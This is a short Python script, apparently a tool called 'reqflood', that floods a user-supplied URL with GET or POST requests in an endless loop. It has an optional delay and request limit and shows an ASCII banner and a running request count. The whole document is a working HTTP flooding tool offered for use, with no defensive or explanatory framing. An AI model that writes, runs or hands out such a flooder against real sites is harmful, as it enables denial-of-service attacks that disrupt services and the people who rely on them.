#!/usr/bin/env python3

import argparse
from time import sleep
import sys
import requests

requests_counter = 0
time = 0
_url = ""

parser = argparse.ArgumentParser(description="./main.py -u [url]")
parser.add_argument("-u", help="HTTP requests to flood", action="store", dest="url")
parser.add_argument("-d", help="Delay (in seconds) between requests", action="store", dest="time", type=int)
parser.add_argument("-l", help="Send only passed number requests", action="store", dest="limit", type=int)
parser.add_argument('-P', '--post', help="Send POST request (default is GET)", action="store_true")

args = parser.parse_args()

if not args.url:
    print("Error. Usage: ./main.py -u [url])")
    sys.exit()
else:
    if (args.url.find("http")) == -1:
        _url = "http://" + args.url
    elif (args.url.find("http")) == 0:
        _url = args.url

if args.time:
    if args.time > 0:
        time = args.time
    else:
        print("Error. Delay must be greater than 0.")
        sys.exit()



print("                  __ _                 _ ")
print("                 / _| |               | |")
print("  _ __ ___  __ _| |_| | ___   ___   __| |")
print(" | '__/ _ \\/ _` |  _| |/ _ \\ / _ \\ / _` |")
print(" | | |  __/ (_| | | | | (_) | (_) | (_| |")
print(" |_|  \\___|\\__, |_| |_|\\___/ \\___/ \\__,_|")
print("              | |                        ")
print("              |_|                        ")

print("\n     ..--|| Created by Datalux ||--..\n")
print("Target url: " + _url + "\n")


while True:
    if requests_counter == args.limit:
        break

    if args.post:
        requests.post(_url)
    else:
        requests.get(_url)
    requests_counter += 1
    print("Sended " + str(requests_counter) + " requests")

    if time > 0:
        sleep(time)
